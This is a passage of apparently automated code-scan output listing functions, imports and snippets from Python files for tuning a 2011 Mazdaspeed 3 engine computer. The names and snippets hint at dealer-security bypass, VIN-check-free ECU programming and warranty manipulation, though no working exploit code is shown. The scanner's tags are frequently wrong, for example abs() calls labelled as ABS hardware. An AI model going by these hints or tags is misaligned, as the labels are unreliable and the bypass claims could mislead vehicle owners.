455, "hardware": "vehicle", "content": "description=\"Aggressive tune for vehicles with downpipe and intercooler upgrades\","}, {"type": "hardware", "line": 456, "hardware": "vehicle", "content": "vehicle_model=\"MAZDASPEED3_2011\","}], "security_logic": [{"type": "security_pattern", "line": 22, "pattern": "key", "content": "id = Column(Integer, primary_key=True)"}, {"type": "security_pattern", "line": 94, "pattern": "key", "content": "id = Column(Integer, primary_key=True)"}, {"type": "security_pattern", "line": 122, "pattern": "key", "content": "id = Column(Integer, primary_key=True)"}, {"type": "security_pattern", "line": 159, "pattern": "key", "content": "id = Column(Integer, primary_key=True)"}, {"type": "security_pattern", "line": 190, "pattern": "key", "content": "id = Column(Integer, primary_key=True)"}, {"type": "security_pattern", "line": 217, "pattern": "key", "content": "id = Column(Integer, primary_key=True)"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["ads"]}
{"file_path": "add24.py", "lines_read": 511, "features_found": [{"type": "import", "module": "core.ecu_communication", "line": null}, {"type": "import", "module": "core.safety_validator", "line": null}, {"type": "import", "module": "utils.logger", "line": null}, {"type": "import", "module": "ECUCommunicator,", "line": null}, {"type": "import", "module": "get_safety_validator", "line": null}, {"type": "import", "module": "get_logger", "line": null}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 1, "hardware": "ECU", "content": "from core.ecu_communication import ECUCommunicator, ECUResponse, ECUState"}, {"type": "hardware", "line": 5, "hardware": "ECU", "content": "class ADD24ECUExploit:"}, {"type": "hardware", "line": 129, "hardware": "vehicle", "content": "vehicle_specific_notes=\"Mazdaspeed 3 benefits greatly from this technique due to its relatively larg"}, {"type": "hardware", "line": 153, "hardware": "vehicle", "content": "vehicle_specific_notes=\"MZR DISI has relatively conservative factory VVT mapping. Aggressive but saf"}, {"type": "hardware", "line": 155, "hardware": "ABS", "content": "'max_intake_advance': '25\u00b0 absolute',"}, {"type": "hardware", "line": 156, "hardware": "ABS", "content": "'max_exhaust_retard': '15\u00b0 absolute',"}, {"type": "hardware", "line": 176, "hardware": "vehicle", "content": "applicable_conditions=\"All performance levels. Particularly beneficial for vehicles running differen"}, {"type": "hardware", "line": 177, "hardware": "vehicle", "content": "vehicle_specific_notes=\"Mazdaspeed 3 knock sensors are sensitive but can be overly conservative. Pre"}, {"type": "hardware", "line": 201, "hardware": "vehicle", "content": "vehicle_specific_notes=\"K04 turbo efficiency drops significantly above 6000 RPM. Tapering boost redu"}, {"type": "hardware", "line": 225, "hardware": "vehicle", "content": "vehicle_specific_notes=\"MZR DISI has robust fueling system capable of advanced strategies. Factory c"}, {"type": "hardware", "line": 274, "hardware": "ECU", "content": "\"ECU calibration issue\""}, {"type": "hardware", "line": 276, "hardware": "ECU", "content": "diagnostic_procedure=\"Check wastegate operation, boost control solenoid, boost leak test, inspect EC"}, {"type": "hardware", "line": 284, "hardware": "vehicle", "content": "ms3_repair_tips=\"Common on tuned vehicles. Check wastegate actuator first. Verify boost control sole"}, {"type": "hardware", "line": 323, "hardware": "vehicle", "content": "\"HPFP failure (common on tuned vehicles)\","}, {"type": "hardware", "line": 328, "hardware": "vehicle", "content": "ms3_repair_tips=\"Common on modified vehicles. Upgrade HPFP for tuned applications. Check cam lobe fo"}, {"type": "hardware", "line": 373, "hardware": "vehicle", "content": "ms3_repair_tips=\"Common on high-mileage vehicles. Start with fluid change and sensor replacement. Us"}], "security_logic": [{"type": "security_pattern", "line": 80, "pattern": "key", "content": "\"Keyway damage from harmonic vibrations\""}, {"type": "security_pattern", "line": 200, "pattern": "key", "content": "applicable_conditions=\"Best for high-RPM operation - track use, highway pulls. Less beneficial for d"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["ads"]}
{"file_path": "add3.py", "lines_read": 503, "features_found": [{"type": "function", "name": "export_restricted_knowledge", "line": 400}, {"type": "function", "name": "__init__", "line": 18}, {"type": "function", "name": "_get_race_calibrations", "line": 23}, {"type": "function", "name": "_track_specific_tunes", "line": 68}, {"type": "function", "name": "_mazda_rnd_secrets", "line": 91}, {"type": "function", "name": "__init__", "line": 117}, {"type": "function", "name": "_dealer_tool_access", "line": 122}, {"type": "function", "name": "_warranty_manipulation", "line": 149}, {"type": "function", "name": "_restricted_service", "line": 172}, {"type": "function", "name": "__init__", "line": 198}, {"type": "function", "name": "_hidden_ecu_parameters", "line": 203}, {"type": "function", "name": "_performance_enhancements", "line": 226}, {"type": "function", "name": "_diagnostic_workarounds", "line": 249}, {"type": "function", "name": "__init__", "line": 275}, {"type": "function", "name": "generate_race_tune", "line": 280}, {"type": "function", "name": "_calculate_race_timing", "line": 294}, {"type": "function", "name": "_calculate_race_fueling", "line": 320}, {"type": "function", "name": "_calculate_race_boost", "line": 338}, {"type": "function", "name": "_calculate_race_vvt", "line": 354}, {"type": "function", "name": "_calculate_race_safety", "line": 370}, {"type": "function", "name": "_enable_race_features", "line": 389}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "cryptography.hazmat.primitives.ciphers", "line": null}, {"type": "import", "module": "cryptography.hazmat.backends", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "hashlib", "line": null}, {"type": "import", "module": "json", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "Cipher,", "line": null}, {"type": "import", "module": "default_backend", "line": null}], "components_found": [{"type": "class", "name": "MazdaRaceEngineering", "line": 15}, {"type": "class", "name": "MazdaDealershipSecrets", "line": 114}, {"type": "class", "name": "AdvancedTuningSecrets", "line": 195}, {"type": "class", "name": "MazdaSpeed3RaceTuning", "line": 272}], "algorithms": [{"type": "algorithm_function", "line": 294, "content": "def _calculate_race_timing(self, track_type: str, power_level: str):"}, {"type": "algorithm_function", "line": 320, "content": "def _calculate_race_fueling(self, track_type: str, power_level: str):"}, {"type": "algorithm_function", "line": 338, "content": "def _calculate_race_boost(self, track_type: str, power_level: str):"}, {"type": "algorithm_function", "line": 354, "content": "def _calculate_race_vvt(self, track_type: str, power_level: str):"}, {"type": "algorithm_function", "line": 370, "content": "def _calculate_race_safety(self, track_type: str, power_level: str):"}], "protocols": [{"type": "protocol", "line": 160, "protocol": "J2534", "content": "'tool': 'Advanced J2534 tool with custom software',"}], "hardware_assumptions": [{"type": "hardware", "line": 127, "hardware": "ECU", "content": "'security_level': 'FACTORY ENGINEERING',"}, {"type": "hardware", "line": 129, "hardware": "ECU", "content": "'ECU programming without VIN checks',"}, {"type": "hardware", "line": 139, "hardware": "ECU", "content": "'security_reset': 'SEC-RES-MAZDA-2024'"}, {"type": "hardware", "line": 153, "hardware": "ECU", "content": "'tool_required': 'M-MDS with security access',"}, {"type": "hardware", "line": 190, "hardware": "TCM", "content": "'tcm_relearn_drive_cycle': 'Specific 15-minute procedure',"}, {"type": "hardware", "line": 199, "hardware": "ECU", "content": "self.hidden_parameters = self._hidden_ecu_parameters()"}, {"type": "hardware", "line": 203, "hardware": "ECU", "content": "def _hidden_ecu_parameters(self):"}, {"type": "hardware", "line": 219, "hardware": "ECU", "content": "'fuel_trim_learning_rate': 'How quickly ECU adapts to changes',"}, {"type": "hardware", "line": 222, "hardware": "TCM", "content": "'transmission_shift_adaptation': 'How TCM learns driving style'"}, {"type": "hardware", "line": 268, "hardware": "TCM", "content": "'transmission_adaptation_reset': 'Clear all TCM learning'"}, {"type": "hardware", "line": 443, "hardware": "ECU", "content": "print(f\"Security Level: {tools['manufacturer_mode']['security_level']}\")"}, {"type": "hardware", "line": 448, "hardware": "ECU", "content": "print(\"\\n3. HIDDEN ECU PARAMETERS\")"}, {"type": "hardware", "line": 482, "hardware": "ECU", "content": "4. Race calibrations exist within factory ECU programming"}, {"type": "hardware", "line": 491, "hardware": "ECU", "content": "1. Launch control and flat-shift can be activated in stock ECU"}], "security_logic": [{"type": "security_pattern", "line": 9, "pattern": "hash", "content": "import hashlib"}, {"type": "security_pattern", "line": 12, "pattern": "algorithm", "content": "from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes"}, {"type": "security_pattern", "line": 12, "pattern": "cipher", "content": "from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes"}, {"type": "security_pattern", "line": 468, "pattern": "key", "content": "for key, value in values.items():"}, {"type": "security_pattern", "line": 469, "pattern": "key", "content": "print(f\"  {key}: {value}\")"}, {"type": "security_pattern", "line": 478, "pattern": "key", "content": "KEY RACE TUNING DISCOVERIES:"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["ads"]}
{"file_path": "add4.py", "lines_read": 143, "features_found": [{"type": "function", "name": "get_ignition_map", "line": 56}, {"type": "function", "name": "get_fuel_map", "line": 63}, {"type": "function", "name": "__init__", "line": 70}, {"type": "function", "name": "_initialize_factory_data", "line": 80}, {"type": "function", "name": "get_factory_calibration", "line": 139}, {"type": "import", "module": "sqlalchemy.ext.declarative", "line": null}, {"type": "import", "module": "sqlalchemy.orm", "line": null}, {"type": "import", "module": "datetime", "line": null}, {"type": "import", "module": "sqlalchemy", "line": null}, {"type": "import", "module": "declarative_base", "line": null}, {"type": "import", "module": "sessionmaker", "line": null}, {"type": "import", "module": "json", "line": null}, {"type": "import", "module": "numpy", "line": null}, {"type": "import", "module": "datetime", "line": null}], "components_found": [{"type": "class", "name": "ECUCalibration", "line": 16}, {"type": "class", "name": "Mazdaspeed3Database", "line": 67}], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 3, "hardware": "ECU", "content": "COMPLETE MAZDASPEED 3 2011 ECU DATABASE"}, {"type": "hardware", "line": 16, "hardware": "ECU", "content": "class ECUCalibration(Base):"}, {"type": "hardware", "line": 17, "hardware": "ECU", "content": "\"\"\"Factory ECU calibration database for MZR 2.3L DISI Turbo\"\"\""}, {"type": "hardware", "line": 18, "hardware": "ECU", "content": "__tablename__ = 'ecu_calibrations'"}, {"type": "hardware", "line": 23, "hardware": "vehicle", "content": "vehicle_model = sa.Column(sa.String(20))  # 'MAZDASPEED3_2011'"}, {"type": "hardware", "line": 24, "hardware": "ECU", "content": "ecu_hardware = sa.Column(sa.String(30))   # 'MZR_DISI_L3K9'"}, {"type": "hardware", "line": 77, "hardware": "ECU", "content": "if not self.session.query(ECUCalibration).first():"}, {"type": "hardware", "line": 126, "hardware": "ECU", "content": "factory_cal = ECUCalibration("}, {"type": "hardware", "line": 129, "hardware": "vehicle", "content": "vehicle_model=\"MAZDASPEED3_2011\","}, {"type": "hardware", "line": 130, "hardware": "ECU", "content": "ecu_hardware=\"MZR_DISI_L3K9\","}, {"type": "hardware", "line": 141, "hardware": "ECU", "content": "return self.session.query(ECUCalibration).filter_by("}, {"type": "hardware", "line": 142, "hardware": "vehicle", "content": "vehicle_model=\"MAZDASPEED3_2011\""}], "security_logic": [{"type": "security_pattern", "line": 4, "pattern": "algorithm", "content": "Contains all factory calibration data, maps, and proprietary algorithms"}, {"type": "security_pattern", "line": 20, "pattern": "key", "content": "id = sa.Column(sa.Integer, primary_key=True)"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["ads"]}
{"file_path": "add5.py", "lines_read": 323, "features_found": [{"type": "function", "name": "__init__", "line": 15}, {"type": "function", "name": "_create_ve_table", "line": 45}, {"type": "function", "name": "calculate_airflow", "line": 68}, {"type": "function", "name": "calculate_turbo_spool", "line": 101}, {"type": "function", "name": "calculate_compressor_efficiency", "line": 136}, {"type": "function", "name": "__init__", "line": 165}, {"type": "function", "name": "_calculate_fmep_curve", "line": 176}, {"type": "function", "name": "calculate_brake_torque", "line": 190}, {"type": "function", "name": "calculate_indicated_power", "line": 207}, {"type": "function", "name": "_timing_efficiency_factor", "line": 236}, {"type": "function", "name": "calculate_exhaust_temperature", "line": 249}, {"type": "function", "name": "__init__", "line": 278}, {"type": "function", "name": "calculate_wheel_torque", "line": 289}, {"type": "function", "name": "calculate_acceleration_force", "line": 298}, {"type": "function", "name": "calculate_theoretical_horsepower", "line": 317}, {"type": "function", "name": "spool_equation", "line": 121}, {"type": "import", "module": "scipy", "line": null}, {"type": "import", "module": "scipy.optimize", "line": null}, {"type": "import", "module": "numpy", "line": null}, {"type": "import", "module": "integrate", "line": null}, {"type": "import", "module": "minimize", "line": null}, {"type": "import", "module": "math", "line": null}], "components_found": [{"type": "class", "name": "TurbochargerPhysics", "line": 12}, {"type": "class", "name": "EngineThermodynamics", "line": 162}, {"type": "class", "name": "PerformanceCalculator", "line": 275}], "algorithms": [{"type": "algorithm_function", "line": 68, "content": "def calculate_airflow(self, rpm, boost_pressure, intake_temp=25):"}, {"type": "algorithm_function", "line": 101, "content": "def calculate_turbo_spool(self, rpm, throttle_position, exhaust_energy):"}, {"type": "algorithm_function", "line": 136, "content": "def calculate_compressor_efficiency(self, pressure_ratio, mass_flow):"}, {"type": "algorithm_function", "line": 176, "content": "def _calculate_fmep_curve(self):"}, {"type": "algorithm_function", "line": 190, "content": "def calculate_brake_torque(self, indicated_torque, rpm):"}, {"type": "algorithm_function", "line": 207, "content": "def calculate_indicated_power(self, mass_airflow, afr, ignition_timing, compression_ratio=9.5):"}, {"type": "algorithm_function", "line": 249, "content": "def calculate_exhaust_temperature(self, mass_airflow, afr, ignition_timing, boost_pressure):"}, {"type": "algorithm_function", "line": 289, "content": "def calculate_wheel_torque(self, engine_torque, gear):"}, {"type": "algorithm_function", "line": 298, "content": "def calculate_acceleration_force(self, wheel_torque, velocity=0):"}, {"type": "algorithm_function", "line": 317, "content": "def calculate_theoretical_horsepower(self, engine_torque, rpm):"}], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 157, "hardware": "ABS", "content": "pr_effect = 1.0 - abs(pressure_ratio - 2.2) * 0.1  # Peak at PR=2.2"}, {"type": "hardware", "line": 242, "hardware": "ABS", "content": "timing_difference = abs(ignition_timing - optimal_timing)"}, {"type": "hardware", "line": 276, "hardware": "vehicle", "content": "\"\"\"Complete vehicle performance calculations with real physics\"\"\""}, {"type": "hardware", "line": 279, "hardware": "vehicle", "content": "self.vehicle_specs = {"}, {"type": "hardware", "line": 291, "hardware": "vehicle", "content": "gear_ratio = self.vehicle_specs['gear_ratios'][gear - 1]"}, {"type": "hardware", "line": 292, "hardware": "vehicle", "content": "final_drive = self.vehicle_specs['final_drive_ratio']"}, {"type": "hardware", "line": 293, "hardware": "vehicle", "content": "efficiency = self.vehicle_specs['drivetrain_efficiency']"}, {"type": "hardware", "line": 300, "hardware": "vehicle", "content": "wheel_radius = self.vehicle_specs['tire_radius']"}, {"type": "hardware", "line": 307, "hardware": "vehicle", "content": "drag_force = 0.5 * air_density * self.vehicle_specs['drag_coefficient'] * \\"}, {"type": "hardware", "line": 308, "hardware": "vehicle", "content": "self.vehicle_specs['frontal_area'] * velocity**2"}, {"type": "hardware", "line": 311, "hardware": "vehicle", "content": "rolling_resistance = self.vehicle_specs['curb_weight'] * 9.81 * 0.015"}], "security_logic": [{"type": "security_pattern", "line": 193, "pattern": "key", "content": "rpm_points = list(self.friction_mean_effective_pressure.keys())"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["ads"]}
{"file_path": "add6.py", "lines_read": 476, "features_found": [{"type": "function", "name": "__init__", "line": 20}, {"type": "function", "name": "forward", "line": 36}, {"type": "function", "name": "__init__", "line": 42}, {"type": "function", "name": "remember", "line": 59}, {"type": "function", "name": "act", "line": 63}, {"type": "function", "name": "replay", "line": 72}, {"type": "function", "name": "__init__", "line": 116}, {"type": "function", "name": "_initialize_tuning_rules", "line": 136}, {"type": "function", "name": "real_time_optimization", "line": 162}, {"type": "function", "name": "_create_state_vector", "line": 187}, {"type": "function", "name": "_get_ai_adjustments", "line": 205}, {"type": "function", "name": "_apply_expert_rules", "line": 221}, {"type": "function", "name": "_optimize_boost_spool", "line": 242}, {"type": "function", "name": "_optimize_ignition_timing", "line": 267}, {"type": "function", "name": "_optimize_vvt_timing", "line": 308}, {"type": "function", "name": "_optimize_afr", "line": 328}, {"type": "function", "name": "_combine_adjustments", "line": 352}, {"type": "function", "name": "_apply_safety_limits", "line": 370}, {"type": "function", "name": "_learn_from_optimization", "line": 399}, {"type": "function", "name": "_calculate_reward", "line": 417}, {"type": "function", "name": "_adjustments_to_action", "line": 443}, {"type": "function", "name": "save_models", "line": 464}, {"type": "function", "name": "load_models", "line": 471}, {"type": "import", "module": "sklearn.ensemble", "line": null}, {"type": "import", "module": "sklearn.preprocessing", "line": null}, {"type": "import", "module": "collections", "line": null}, {"type": "import", "module": "numpy", "line": null}, {"type": "import", "module": "torch", "line": null}, {"type": "import", "module": "torch.nn", "line": null}, {"type": "import", "module": "torch.optim", "line": null}, {"type": "import", "module": "RandomForestRegressor", "line": null}, {"type": "import", "module": "StandardScaler", "line": null}, {"type": "import", "module": "joblib", "line": null}, {"type": "import", "module": "deque", "line": null}, {"type": "import", "module": "random", "line": null}], "components_found": [{"type": "class", "name": "AITuningNetwork", "line": 17}, {"type": "class", "name": "ReinforcementTuner", "line": 39}, {"type": "class", "name": "AITuningSystem", "line": 113}], "algorithms": [{"type": "algorithm_function", "line": 417, "content": "def _calculate_reward(self, data, adjustments):"}], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 195, "hardware": "ABS", "content": "abs(data['knock_retard']) / 8.0,         # Normalized knock"}, {"type": "hardware", "line": 303, "hardware": "ABS", "content": "if abs(base_timing_adj) > 0.1:"}], "security_logic": [{"type": "security_pattern", "line": 360, "pattern": "key", "content": "for key, ai_value in ai_adjustments.items():"}, {"type": "security_pattern", "line": 361, "pattern": "key", "content": "if key in combined:"}, {"type": "security_pattern", "line": 363, "pattern": "key", "content": "combined[key] = 0.7 * combined[key] + 0.3 * ai_value"}, {"type": "security_pattern", "line": 366, "pattern": "key", "content": "combined[key] = ai_value * 0.5"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["ads"]}
{"file_path": "add7.py", "lines_read": 645, "features_found": [{"type": "function", "name": "test_advanced_turbo_spool", "line": 593}, {"type": "function", "name": "test_advanced_ai_mapping", "line": 618}, {"type": "function", "name": "__init__", "line": 15}, {"type": "function", "name": "_create_compressor_map", "line": 53}, {"type": "function", "name": "calculate_turbo_spool_time", "line": 80}, {"type": "function", "name": "_turbo_dynamics", "line": 130}, {"type": "function", "name": "_calculate_exhaust_energy", "line": 165}, {"type": "function", "name": "_calculate_engine_airflow", "line": 199}, {"type": "function", "name": "_calculate_turbine_power", "line": 217}, {"type": "function", "name": "_calculate_compressor_power", "line": 254}, {"type": "function", "name": "_get_compressor_efficiency", "line": 284}, {"type": "function", "name": "_calculate_friction_losses", "line": 296}, {"type": "function", "name": "__init__", "line": 312}, {"type": "function", "name": "_create_advanced_action_mapping", "line": 324}, {"type": "function", "name": "_create_actor_network", "line": 361}, {"type": "function", "name": "_create_critic_network", "line": 389}, {"type": "function", "name": "map_action_to_adjustments", "line": 422}, {"type": "function", "name": "_select_action_index", "line": 439}, {"type": "function", "name": "_scale_adjustments_by_state", "line": 462}, {"type": "function", "name": "_apply_non_linear_corrections", "line": 499}, {"type": "function", "name": "__init__", "line": 545}, {"type": "function", "name": "add", "line": 554}, {"type": "function", "name": "sample", "line": 569}, {"type": "function", "name": "update_priorities", "line": 587}, {"type": "function", "name": "time_to_target", "line": 113}, {"type": "function", "name": "__init__", "line": 366}, {"type": "function", "name": "forward", "line": 384}, {"type": "function", "name": "__init__", "line": 394}, {"type": "function", "name": "forward", "line": 414}, {"type": "import", "module": "scipy.integrate", "line": null}, {"type": "import", "module": "scipy.optimize", "line": null}, {"type": "import", "module": "numpy", "line": null}, {"type": "import", "module": "solve_ivp", "line": null}, {"type": "import", "module": "minimize", "line": null}, {"type": "import", "module": "math", "line": null}, {"type": "import", "module": "torch.nn", "line": null}, {"type": "import", "module": "torch.nn", "line": null}], "components_found": [{"type": "class", "name": "AdvancedTurboPhysics", "line": 12}, {"type": "class", "name": "AdvancedAITuning", "line": 309}, {"type": "class", "name": "PrioritizedReplayBuffer", "line": 542}, {"type": "class", "name": "ActorNetwork", "line": 365}, {"type": "class", "name": "CriticNetwork", "line": 393}], "algorithms": [{"type": "algorithm_function", "line": 80, "content": "def calculate_turbo_spool_time(self, engine_rpm, throttle_position, current_turbo_rpm=0,"}, {"type": "algorithm_function", "line": 165, "content": "def _calculate_exhaust_energy(self, engine_rpm, throttle_position, exhaust_temp, exhaust_pressure):"}, {"type": "algorithm_function", "line": 199, "content": "def _calculate_engine_airflow(self, rpm, throttle_position):"}, {"type": "algorithm_function", "line": 217, "content": "def _calculate_turbine_power(self, turbo_omega, exhaust_energy):"}, {"type": "algorithm_function", "line": 254, "content": "def _calculate_compressor_power(self, turbo_omega, target_turbo_rpm):"}, {"type": "algorithm_function", "line": 296, "content": "def _calculate_friction_losses(self, turbo_omega):"}], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 68, "hardware": "ABS", "content": "flow_dist = abs(flow - peak_flow) / peak_flow"}, {"type": "hardware", "line": 69, "hardware": "ABS", "content": "pr_dist = abs(pr - peak_pr) / peak_pr"}, {"type": "hardware", "line": 114, "hardware": "ABS", "content": "return abs(rpm_function(t)[0] - target_turbo_rpm)"}, {"type": "hardware", "line": 158, "hardware": "ABS", "content": "alpha = net_torque / I if abs(net_torque) > 1e-6 else 0"}, {"type": "hardware", "line": 243, "hardware": "ABS", "content": "ratio_deviation = abs(velocity_ratio - optimal_ratio) / optimal_ratio"}, {"type": "hardware", "line": 289, "hardware": "ABS", "content": "pr_idx = np.argmin(np.abs(map_data['pressure_ratio'] - pressure_ratio))"}, {"type": "hardware", "line": 290, "hardware": "ABS", "content": "flow_idx = np.argmin(np.abs(map_data['flow'] - mass_flow))"}, {"type": "hardware", "line": 512, "hardware": "ABS", "content": "rpm_deviation = abs(rpm - optimal_rpm) / optimal_rpm"}], "security_logic": [{"type": "security_pattern", "line": 491, "pattern": "key", "content": "for key in ['ignition_timing', 'boost_target', 'target_afr', 'wgdc_reduction',"}, {"type": "security_pattern", "line": 494, "pattern": "key", "content": "if key in scaled:"}, {"type": "security_pattern", "line": 495, "pattern": "key", "content": "scaled[key] *= overall_factor"}, {"type": "security_pattern", "line": 525, "pattern": "key", "content": "for key in ['wgdc_reduction', 'wgdc_increase', 'boost_target']:"}, {"type": "security_pattern", "line": 526, "pattern": "key", "content": "if key in corrected:"}, {"type": "security_pattern", "line": 527, "pattern": "key", "content": "corrected[key] *= lag_compensation"}, {"type": "security_pattern", "line": 535, "pattern": "key", "content": "for key in ['vvt_intake_advance', 'vvt_intake_retard',"}, {"type": "security_pattern", "line": 537, "pattern": "key", "content": "if key in corrected:"}, {"type": "security_pattern", "line": 538, "pattern": "key", "content": "corrected[key] *= vvt_effectiveness"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["ads"]}
{"file_path": "add8.py", "lines_read": 476, "features_found": [{"type": "function", "name": "__init__", "line": 20}, {"type": "function", "name": "forward", "line": 36}, {"type": "function", "name": "__init__", "line": 42}, {"type": "function", "name": "remember", "line": 59}, {"type": "function", "name": "act", "line": 63}, {"type": "function", "name": "replay", "line": 72}, {"type": "function", "name": "__init__", "line": 116}, {"type": "function", "name": "_initialize_tuning_rules", "line": 136}, {"type": "function", "name": "real_time_optimization", "line": 162}, {"type": "function", "name": "_create_state_vector", "line": 187}, {"type": "function", "name": "_get_ai_adjustments", "line": 205}, {"type": "function", "name": "_apply_expert_rules", "line": 221}, {"type": "function", "name": "_optimize_boost_spool", "line": 242}, {"type": "function", "name": "_optimize_ignition_timing", "line": 267}, {"type": "function", "name": "_optimize_vvt_timing", "line": 308}, {"type": "function", "name": "_optimize_afr", "line": 328}, {"type": "function", "name": "_combine_adjustments", "line": 352}, {"type": "function", "name": "_apply_safety_limits", "line": 370}, {"type": "function", "name": "_learn_from_optimization", "line": 399}, {"type": "function", "name": "_calculate_reward", "line": 417}, {"type": "function", "name": "_adjustments_to_action", "line": 443}, {"type": "function", "name": "save_models", "line": 464}, {"type": "function", "name": "load_models", "line": 471}, {"type": "import", "module": "sklearn.ensemble", "line": null}, {"type": "import", "module": "sklearn.preprocessing", "line": null}, {"type": "import", "module": "collections", "line": null}, {"type": "import", "module": "numpy", "line": null}, {"type": "import", "module": "torch", "line": null}, {"type": "import", "module": "torch.nn", "line": null}, {"type": "import", "module": "torch.optim", "line": null}, {"type": "import", "module": "RandomForestRegressor", "line": null}, {"type": "import", "module": "StandardScaler", "line": null}, {"type": "import", "module": "joblib", "line": null}, {"type": "import", "module": "deque", "line": null}, {"type": "import", "module": "random", "line": null}], "components_found": [{"type": "class", "name": "AITuningNetwork", "line": 17}, {"type": "class", "name": "ReinforcementTuner", "line": 39}, {"type": "class", "name": "AITuningSystem", "line": 113}], "algorithms": [{"type": "algorithm_function", "line": 417, "content": "def _calculate_reward(self, data, adjustments):"}], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 195, "hardware": "ABS", "content": "abs(data['knock_retard']) / 8.0,         # Normalized knock"}, {"type": "hardware", "line": 303, "hardware": "ABS", "content": "if abs(base_timing_adj) > 0.1:"}], "security_logic": [{"type": "security_pattern", "line": 360, "pattern": "key", "content": "for key, ai_value in ai_adjustments.items():"}, {"type": "security_pattern", "line": 361, "pattern": "key", "content": "if key in combined:"}, {"type": "security_pattern", "line": 363, "pattern": "key", "content": "combined[key] = 0.7 * combined[key] + 0.3 * ai_value"}, {"type": "security_pattern", "line": 366, "pattern": "key", "content": "combined[key] = ai_value * 0.5"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["ads"]}
{"file_path": "add9.py", "lines_read": 323, "features_found": [{"type": "function", "name": "__init__", "line": 15}, {"type": "function", "name": "_create_ve_table", "line": 45}, {"type": "function", "name": "calculate_airflow", "line": 68}, {"type": "function", "name": "calculate_turbo_spool", "line": 101}, {"type": "function", "name": "calculate_compressor_efficiency", "line": 136}, {"type": "function", "name": "__init__", "line": 165}, {"type": "function", "name": "_calculate_fmep_curve", "line": 176}, {"type": "function", "name": "calculate_brake_torque", "line": 190}, {"type": "function", "name": "calculate_indicated_power", "line": 207}, {"type": "function", "name": "_timing_efficiency_factor", "line": 236}, {"type": "function", "name": "calculate_exhaust_temperature", "line": 249}, {"type": "function", "name": "__init__", "line": 278}, {"type": "function", "name": "calculate_wheel_torque", "line": 289}, {"type": "function", "name": "calculate_acceleration_force", "line": 298}, {"type": "function", "name": "calculate_theoretical_horsepower", "line": 317}, {"type": "function", "name": "spool_equation", "line": 121}, {"type": "import", "module": "scipy", "line": null}, {"type": "import", "module": "scipy.optimize", "line": null}, {"type": "import", "module": "numpy", "line": null}, {"type": "import", "module": "integrate", "line": null}, {"type": "import", "module": "minimize", "line": null}, {"type": "import", "module": "math", "line": null}], "components_found": [{"type": "class", "name": "TurbochargerPhysics", "line": 12}, {"type": "class", "name": "EngineThermodynamics", "line": 162}, {"type": "class", "name": "PerformanceCalculator", "line": 275}], "algorithms": [{"type": "algorithm_function", "line": 68, "content": "def calculate_airflow(self, rpm, boost_pressure, intake_temp=25):"}, {"type": "algorithm_function", "line": 101, "content": "def calculate_turbo_spool(self, rpm, throttle_position, exhaust_energy):"}, {"type": "algorithm_function", "line": 136, "content": "def calculate_compressor_efficiency(self, pressure_ratio, mass_flow):"}, {"type": "algorithm_function", "line": 176, "content": "def _calculate_fmep_curve(self):"}, {"type": "algorithm_function", "line": 190, "content": "def calculate_brake_torque(self, indicated_torque, rpm):"}, {"type": "algorithm_function", "line": 207, "content": "def calculate_indicated_power(self, mass_airflow, afr, ignition_timing, compression_ratio=9.5):"}, {"type": "algorithm_function", "line": 249, "content": "def calculate_exhaust_temperature(self, mass_airflow, afr, ignition_timing, boost_pressure):"}, {"type": "algorithm_function", "line": 289, "content": "def calculate_wheel_torque(self, engine_torque, gear):"}, {"type": "algorithm_function", "line": 298, "content": "def calculate_acceleration_force(self, wheel_torque, velocity=0):"}, {"type": "algorithm_function", "line": 317, "content": "def calculate_theoretical_horsepower(self, engine_torque, rpm):"}], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 157, "hardware": "ABS", "content": "pr_effect = 1.0 - abs(pressure_ratio - 2.2) * 0.1  # Peak at PR=2.2"}, {"type": "hardware", "line": 242, "hardware": "ABS", "content": "timing_difference = abs(ignition_timing - optimal_timing)"}, {"type": "hardware", "line": 276, "hardware": "vehicle", "content": "\"\"\"Complete vehicle performance calculations with real physics\"\"\""}, {"type": "hardware", "line": 279, "hardware": "vehicle", "content": "self.vehicle_specs = {"}, {"type": "hardware", "line": 291, "hardware": "vehicle", "content": "gear_ratio = self.vehicle_specs['gear_ratios'][gear - 1]"}, {"type": "hardware", "line": 292, "hardware": "vehicle", "content": "final_drive = self.vehicle_specs['final_drive_ratio']"}, {"type": "hardware", "line": 293, "hardware": "vehicle", "content": "efficiency = self.vehicle_specs['drivetrain_efficiency']"}, {"type": "hardware", "line": 300, "hardware": "vehicle", "content": "wheel_radius = self.vehicle_specs['tire_radius']"}, {"type": "hardware", "line": 307, "hardware": "vehicle", "content": "drag_force = 0.5 * air_density * self.vehicle_specs['drag_coefficient'] * \\"}, {"type": "hardware", "line": 308, "hardware": "vehicle", "content": "self.vehicle_specs['frontal_area'] * velocity**2"}, {"type": "hardware", "line": 311, "hardware": "vehicle", "content": "rolling_resistance = self.vehicle_specs['curb_weight'] * 9.81 * 0.015"}], "security_logic": [{"type": "security_pattern", "line": 193, "pattern": "key", "content": "rpm_points = list(self.friction_mean_effective_pressure.keys())"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["ads"]}
{"file_path": "agent.md", "lines_read": 38, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
